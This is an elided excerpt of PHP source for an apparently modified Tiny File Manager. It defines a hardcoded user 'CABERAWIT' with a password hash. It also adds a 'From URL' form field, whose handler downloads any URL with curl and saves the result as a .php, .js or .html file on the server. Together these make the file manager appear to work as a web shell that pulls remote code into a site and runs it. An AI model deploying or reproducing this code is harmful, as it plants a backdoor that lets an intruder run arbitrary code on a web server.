...
$use_auth = true;
$auth_users = array(
    'CABERAWIT' => '$2a$12$y75puA0rdrTc4HYWpCDhpOOapMg2qMsMZsg.FGIPbkrN84LWzBGYK', 
);
...
if (isset($_POST['newfilename'], $_POST['newfile'], $_POST['token']) && !FM_READONLY) {
    ...
    $url = isset($_POST['fileurl']) ? trim($_POST['fileurl']) : ''; // ✅ Tambahan: ambil URL dari form
        ...
        if ($type == "file") {
            if (!file_exists($path . '/' . $new)) {
                if (fm_is_valid_ext($new)) {
                    ...
                    if (!empty($url) && in_array($ext, ['php', 'html', 'txt', 'js', 'css'])) {
                        $ch = curl_init($url);
                        ...
                        if ($fileContent === false) {
                            $fileContent = "<?php\n// Created by Tiny File Manager\n// " . date('Y-m-d H:i:s') . "\necho 'Download failed'; ?>";
                            fm_set_msg(lng('Error fetching file from URL'), 'error');
                        } else {
                            fm_set_msg(lng('File downloaded from URL'), 'success');
                        }

                        file_put_contents($fullPath, $fileContent);
                    } else {
                      
                        @fopen($fullPath, 'w') or die('Cannot open file:  ' . $new);
                    }
        ...
        <div class="modal-dialog" role="document">
            <form class="modal-content <?php echo fm_get_theme(); ?>" method="post">
                ...
                <div class="modal-body">
                    ...
                    <p class="mt-3"><label for="fileurl">From URL</label></p>
                            <input type="text" name="fileurl" id="fileurl" class="form-control" placeholder="LINK URL">
                </div>
